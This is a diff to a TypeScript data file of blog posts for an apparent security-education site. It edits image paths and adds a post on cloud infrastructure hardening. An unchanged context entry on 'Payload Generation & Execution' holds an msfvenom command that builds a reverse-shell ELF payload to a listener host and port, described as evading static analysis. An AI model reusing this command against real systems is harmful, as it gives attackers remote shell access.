@@ -36,13 +36,42 @@ export const initialBlogData: BlogPost[] = [
         title: "Vulnerability Synthesis",
         description: "Once the reconnaissance data is ingested, the AI synthesizes potential attack vectors by cross-referencing CVE databases with the specific configuration identified.",
         code: "curl -X POST http://ai-engine:8080/analyze -d @recon_report.json",
-        images: ["/images/events/1774087109084/collage-1.jpg"]
+        images: ["/intelligence/1/collage-1.jpg"]
       },
       {
         title: "Payload Generation & Execution",
         description: "The final step is the generation of a context-aware payload designed to exploit the synthesized vulnerability while remaining undetected by static analysis tools.",
         code: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf --ai-obfuscate",
-        images: ["/images/events/1774087109084/collage-2.jpg"]
+        images: ["/intelligence/1/collage-2.jpg"]
+      }
+    ]
+  },
+  {
+    id: 2,
+    title: "Securing Cloud Infrastructures at Scale",
+    date: "February 2026",
+    summary: "Tactical guidelines for maintaining a fortress-level security posture in complex multi-cloud environments.",
+    videoUrl: "https://www.youtube.com/watch?v=37Omb6e64To",
+    mainImage: "/intelligence/2/main.jpg",
+    tags: ["Cloud", "Infrastructure", "DevSecOps"],
+    steps: [
+      {
+        title: "Identity and Access Management Audit",
+        description: "Initial audit of IAM roles and permissions to identify over-privileged accounts and potential privilege escalation paths.",
+        code: "prowler aws --services iam --severity high",
+        images: ["/intelligence/2/step1.jpg"]
+      },
+      {
+        title: "Network Perimeter Hardening",
+        description: "Implementing strict security groups and NACLs to enforce the principle of least privilege at the network layer.",
+        code: "aws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 443 --cidr 0.0.0.0/0",
+        images: ["/intelligence/2/step2.jpg"]
+      },
+      {
+        title: "Automated Compliance Monitoring",
+        description: "Deploying automated scripts to continuously monitor the infrastructure for compliance with industry standards like CIS and SOC2.",
+        code: "terraform plan -out=compliance_check.tfplan",
+        images: ["/intelligence/2/step3.jpg"]
       }
     ]
   }
